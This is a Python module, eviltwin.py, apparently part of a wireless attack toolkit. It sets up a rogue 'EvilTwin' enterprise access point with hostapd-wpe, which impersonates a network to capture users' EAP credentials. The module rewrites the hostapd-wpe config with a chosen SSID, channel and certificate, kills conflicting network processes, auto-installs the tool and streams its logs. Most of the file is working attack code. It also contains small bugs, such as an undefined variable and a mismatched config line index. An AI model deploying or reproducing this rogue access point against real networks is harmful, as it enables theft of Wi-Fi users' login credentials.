# Module: eviltwin.py
# Description: Creates an EAP based access point AKA EvilTwin.
# Author: Nick Sanzotta
# Contributors: 
# Version: v 1.08162017

try:
	import os, sys, time, threading
	from subprocess import Popen, PIPE
	from theme import *
except Exception as e:
	print('\n [!] Error ' +str(e))

class evilTwin(threading.Thread):
	def __init__(self, interface, ssid, channel, macaddress, hostname, \
		server_cert='/etc/hostapd-wpe/certs/server.pem', private_key='/etc/hostapd-wpe/certs/server.key', ):
		threading.Thread.__init__(self)
		self.setDaemon(0) # Creates thread in non-daemon mode
		self.interface = interface
		self.macaddress = macaddress
		self.ssid = ssid
		self.channel = channel
		self.hostname = hostname
		self.wirelessInt = str(self.interface.get_ifname())
		self.server_cert= server_cert
		self.private_key = private_key

	def run(self):
		self.dependency_check()
		self.hostapd_config()
		self.sanity_check()
		time.sleep(1)
		p1 = Popen(['hostapd-wpe', '/etc/hostapd-wpe/hostapd-wpe2.conf'], stdout=PIPE)
		print('[i] Real-time hostapd-wpe logs below:\n')
		for line in iter(p1.stdout.readline, ''):
		    sys.stdout.write(line)
		    # f.write(line)
	
	def dependency_check(self):
		'''Checks if hostapd-wpe is installed, if not installs it'''
		p1 = Popen(['which', 'hostapd-wpe'], stdout=PIPE)
		if p1.communicate()[0]:
			p2 = Popen(["dpkg-query", "-W", "-f", "${version}", "hostapd-wpe"], stdout=PIPE)
			print(blue('i')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
		else:
			print(blue(i)+'Installing hostapd-wpe ...')
			p3 = Popen(['apt-get install -y hostapd-wpe'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
			p3.wait()
			print(' [*] Installation completed')
			os.system('which hostapd-wpe')
			os.system('hostapd-wpe -v')
			print('\n')
			# print(p2.communicate())
	
	def sanity_check(self):
		'''Terminates conflicting processes'''
		p1 = Popen(['airmon-ng','check','kill'], stdout=PIPE)

	def fix_broken_package(self):
		'''Fixes broken hostapd-wpe packages'''
		os.system('apt-get purge hostapd-wpe')
		os.system('apt-get update')
		os.system('apt-get install hostapd-wpe')

	def hostapd_config(self):
		'''Creates hostadp-wpe config file based of parameter values'''
		with open('/etc/hostapd-wpe/hostapd-wpe.conf', 'r') as file:
		    # Read a List of lines into data
		    data = file.readlines()

		# Lines to modify in the hostapd-wpe config file
		data[3] = 'interface=%s\n' % (self.wirelessInt)
		data[14]= 'ssid=%s\n' % (self.ssid)
		data[15]= 'channel=%s\n' % (self.channel)
		data[8] = 'server_cert=%s\n' % (self.server_cert)
		data[9] = 'private_key=%s\n' % (self.private_key)

		print(green('*')+'EvilTwin Details:')
		print('     AP Interface: %s' % (data[3].rstrip('\n')))
		print('     SSID: %s' % (data[14].rstrip('\n')))
		print('     Channel: %s' % (data[16].rstrip('\n')))
		print('     Server Cert: %s' % (data[8].rstrip('\n')))
		print('     Private Key: %s' % (data[9]))

		# Write new hostapd-wpe config file
		with open('/etc/hostapd-wpe/hostapd-wpe2.conf', 'w') as file:
		    file.writelines( data )
		#/var/run/hostapd-wpe/wlan0

		# print(' 4: # interface=wlan0
		# print(' 7: # eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
		# print(' 8: # ca_cert=/etc/hostapd-wpe/certs/ca.pem
		# print(' 9: # server_cert=/etc/hostapd-wpe/certs/server.pem
		# print(' 10:# private_key=/etc/hostapd-wpe/certs/server.key
		# print(' 11:# private_key_passwd=whatever
		# print(' 12:# dh_file=/etc/hostapd-wpe/certs/dh
		# print(' 15:# ssid=hostapd-wpe
		# print(' 16:# channel=1